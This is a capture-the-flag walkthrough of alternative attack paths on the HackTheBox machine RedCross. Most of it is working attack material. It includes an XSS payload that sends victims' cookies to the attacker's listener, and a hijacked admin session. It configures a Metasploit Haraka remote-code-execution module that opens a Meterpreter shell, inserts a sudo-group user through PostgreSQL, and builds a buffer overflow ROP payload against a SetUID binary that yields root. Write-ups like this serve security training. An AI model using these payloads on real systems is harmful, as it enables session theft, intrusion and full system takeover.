# Alternative way to exploit RedCross

## Different ways to exploit the Web Services

Instead of exploiting the **SQL Injection vulnerability**, there are more ways to to exploit the web services on port 443.

### Cross-Site-Scripting (XSS) in Contact Form

The contact form on _intra.redcross.htb/?page=contact_ is used to request access to the intranet.
By guessing that this has to be processed by someone, we can try to abuse this functionality with a **Cross-Site-Scripting vulnerability**.  

Lets start a listener on our local IP and port 80 to get requests and send JavaScript with the form:
```
<script>document.write('<img src="http://10.10.14.6/test.gif?cookie=' + document.cookie + '" />')</script>
```

The first two fields, blocked requests and alerted, that someone is doing something nasty, but the third form field allowed the request and after a while the listener got a response back:
```
Ncat: Connection from 10.10.10.113.
Ncat: Connection from 10.10.10.113:40500.
GET /test.gif?cookie=PHPSESSID=4dcd7ecnqq39cgj492nk84p2k0;%20LANG=EN_US;%20SINCE=1612024348;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1
```

This response contains a session cookie and it tells that it comes from the domain _admin_ that is the subdomain _admin.redcross.htb_.
By replacing the current _PHPSESSID cookie_ with _"4dcd7ecnqq39cgj492nk84p2k0"_, we get logged in and have access to the admin panel.

### Exploiting Haraka on admin.redcross.htb

Instead of using the **Command Injection vulnerability** there is another way to get a shell on the box.
The feature _Network Access_ allows to whitelist IP addresses and after sending mine, it shows that it runs `iptables` in the background:
```
DEBUG: All checks passed... Executing iptables Network access granted to 10.10.14.6 Network access granted to 10.10.14.6
```

After whitelisting my own IP, another port scan with **Nmap** will show new results:
```
nmap -p- 10.10.10.113
```
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
1025/tcp open  NFS-or-IIS
5432/tcp open  postgresql
```

Enumerating the service on port 1025 with `ncat`:
```
nc -v 10.10.10.113 1025

220 redcross ESMTP Haraka 2.8.8 ready
```

It runs [Haraka](https://haraka.github.io/) version 2.8.8 which is an open source SMTP server written in Node.js.
Searching for vulnerabilities:
```
searchsploit haraka

Haraka < 2.8.9 - Remote Command Execution
```

There is also a **Metasploit module** that can be used:
```
msf6 > use exploit/linux/smtp/haraka

msf6 exploit(linux/smtp/haraka) > set LPORT 9002
msf6 exploit(linux/smtp/haraka) > set LHOST tun0

msf6 exploit(linux/smtp/haraka) > set SRVHOST 10.10.14.6
msf6 exploit(linux/smtp/haraka) > set SRVPORT 9001
msf6 exploit(linux/smtp/haraka) > set rhost 10.10.10.113
msf6 exploit(linux/smtp/haraka) > set rport 1025
msf6 exploit(linux/smtp/haraka) > set email_from tricia@redcross.htb
msf6 exploit(linux/smtp/haraka) > set email_to penelope@redcross.htb

msf6 exploit(linux/smtp/haraka) > exploit
```

After running the exploit and waiting for a while, a **Meterpreter session** starts with the privileges of _penelope_.

## Privilege Escalation

### Add user to sudo group

Instead of searching for credentials in the configuration files in _/etc_ for a high-privileged user in the **PostgreSQL database**, it is possible to create a new user and put the new user via the **PostgreSQL** in the _sudo group_.
```
psql -h 127.0.0.1 -U unixusrmgr unix
```

Creating a root user with the GID 27 which is the _sudo group_:
```
INSERT INTO passwd_table (username, passwd, gid, homedir) values ('sudouser', '$1$61vWy0S8$fDRliAv0Lnr6lf.z9qD1j1', 27, '/');
```

Switching user to _sudouser_:
```
su - sudouser
```

Now it is possible to switch user to root as the created user is in the _sudo group_:
```
sudo su
```

### Buffer Overflow of iptctl

Instead of the **PostgreSQL** ways, there is a binary in _/opt/iptctl_ with the **SetUID bit** set and vulnerable to **Buffer Overflow**.
After getting on the web panel and creating a user to SSH into the box, the source code of this can be found in _/home/public/src/iptctl.c_.

In the source code it shows that it has an interactive mode when using the _"-i"_ parameter and that is where the vulnerability is.
I will copy the binary to my local box to analyze it further.

When it gets too many characters as input in this mode, it will result in a **Segmentation Fault**:
```
./iptctl -i

Entering interactive mode
Action(allow|restrict|show): showAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
IP address: 1.2.3.4
Segmentation fault
```

Lets execute it with `gdb` and see where the buffer gets overwritten by creating a unique pattern with 64 characters:
```
pattern_create 64

aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
```
```
set args -i

run

Starting program: ./iptctl -i
Entering interactive mode
Action(allow|restrict|show): showaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
IP address: 1.2.3.4
```

The overflow happens at _"aaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa"_ and the offset of this pattern is at 30:
```
pattern offset aaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa

[+] Found at offset 30 (big-endian search)
```

To write exploit code, there is some more information needed.

Addresses of functions that can be used:
```
objdump -D -j .plt iptctl | grep \@plt
```
```
00000000004006e0 <strncpy@plt>:
00000000004006f0 <strcpy@plt>:
0000000000400700 <puts@plt>:
0000000000400710 <strlen@plt>:
0000000000400720 <printf@plt>:
0000000000400730 <fgets@plt>:
0000000000400740 <inet_pton@plt>:
0000000000400750 <fflush@plt>:
0000000000400760 <execvp@plt>:
0000000000400770 <exit@plt>:
0000000000400780 <setuid@plt>:
0000000000400790 <fork@plt>:
00000000004007a0 <strstr@plt>:
```

Getting address of _/bin/sh_ with `gdb`:
```
gef> search-pattern sh

0x40046e - 0x400470 --> "sh"
```

Getting return addresses of _rdi_ and _rsi_ with **Radare2**:
```
/R pop rdi

0x00400de3    5f    pop rdi
```
```
/R pop rsi

0x00400de1    5e    pop rsi
```

After getting all of those addresses, exploit code can be created and the Python script _redcross_bof.py_ can be found in this repository.
When running the script, it creates a payload, that has to be passed to the binary:
```
python redcross_bof.py > payload.txt
```

Bringing the payload to the box:
```
base64 -w 0 payload.txt

echo c2hvd0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQeMNQAAAAAAAAAAAAAAAAACAB0AAAAAAAOMNQAAAAAAAbgRAAAAAAADhDUAAAAAAAAAAAAAAAAAAAAAAAAAAAABgB0AAAAAAAAoxLjIuMy40Cg== > payload.b64

base64 -d payload.b64 > payload.txt
```

Executing _iptctl_ with the payload:
```
(cat /dev/shm/payload.txt; cat) | ./iptctl -i
```

There will be no output, but system commands work and `id` shows that we became root!
